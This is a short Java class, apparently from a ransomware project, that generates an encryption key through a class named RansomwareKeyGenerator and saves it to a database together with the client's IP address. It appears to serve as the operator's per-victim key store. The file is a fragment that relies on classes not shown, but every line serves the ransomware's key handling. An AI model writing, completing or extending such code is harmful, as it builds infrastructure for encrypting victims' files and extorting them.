package keys;

import javax.inject.Inject;

import repositories.KeyRepository;
import entities.CryptoKey;

public class KeyManagement {
	@Inject
	private KeyRepository repository;

	public <T> T createKey(String encalgo, String ip) {
		RansomwareKeyGenerator<T> clientKey = new RansomwareKeyGenerator<T>();
		T key = (T) clientKey.generateKey(encalgo);
		save(new CryptoKey<T>(ip, key, encalgo)); // Save to DB
		return (T) key;

	}

	public void save(CryptoKey entity) {
		repository.save(entity);

	}

}
